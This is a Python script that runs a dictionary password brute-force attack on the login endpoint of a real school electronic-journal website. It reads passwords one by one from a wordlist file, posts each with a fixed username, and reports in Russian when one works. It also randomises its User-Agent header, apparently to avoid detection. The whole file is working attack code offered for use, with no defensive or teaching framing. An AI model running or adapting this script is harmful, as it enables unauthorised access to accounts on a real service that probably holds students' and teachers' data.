import requests
from bs4 import BeautifulSoup
import random

BASE = "https://eljur.gospmr.org"

session = requests.Session()
def ses_update():
    session.headers.update({
        "User-Agent": (
            f"Mozilla/{random.randint(2, 5)}.0 (Linux {random.randint(1, 1000000)}; Android {random.randint(1, 1000000)}); CPH2841) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{random.randint(70, 126)}.0.0.0 Mobile Safari/{random.randint(20, 537)}.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Origin": BASE,
        "Referer": f"{BASE}/authorize",
    })
ses_update()

def abs_url(href):
    if href.startswith("http"):
        return href
    return BASE + href

def get_soup(url):
    r = session.get(url)
    r.encoding = "utf-8"
    return BeautifulSoup(r.text, "html.parser")

def post_soup(url, data=None):
    r = session.post(url, data=data)
    r.encoding = "utf-8"
    return BeautifulSoup(r.text, "html.parser")

def reg(login_val, password_val):
    data = {
        "username": login_val,
        "password": password_val,
        "return_uri": "/",
    }
    response = session.post(f"{BASE}/ajaxauthorize", data=data)
    try:
        result = response.json()
        if result == {'actions': [], 'errors': [{'field': None, 'text': 'Неверный логин или пароль'}], 'result': False}:
            print(f"{password_val} <== Неверный")
            return
        if "errors" in result and result["errors"]:
            print("\nОшибка входа:")
            for err in result["errors"]:
                print(f"  - {err.get('text', err)}")
        elif "actions" in result:
            for action in result["actions"]:
                if action.get("type") == "redirect" and action.get("url"):
                    redirect_url = action["url"]
                    if not redirect_url.startswith("http"):
                        redirect_url = BASE + redirect_url
                    print(f"Совпадение найденно: {login_val}   -   {password_val}")
                    return "sigma"
        else:
            print("Неожиданный ответ сервера")
    except Exception as e:
        print("Не удалось разобрать ответ:", e)
        print(response.text[:500])

login = 'LOGIN_REG'
count = 0
count_brute = 0
with open('FILE_BRUTE_REG', 'r', encoding='utf-8', errors='replace') as file:
    lines = file.readlines()
    while True:
        try:
            password = lines[count_brute].strip()
        except IndexError:
            print("Пароля в словаре нет")
            break
        count_brute += 1
        if reg(login, password) == "sigma":
            break
        else:
            count += 1
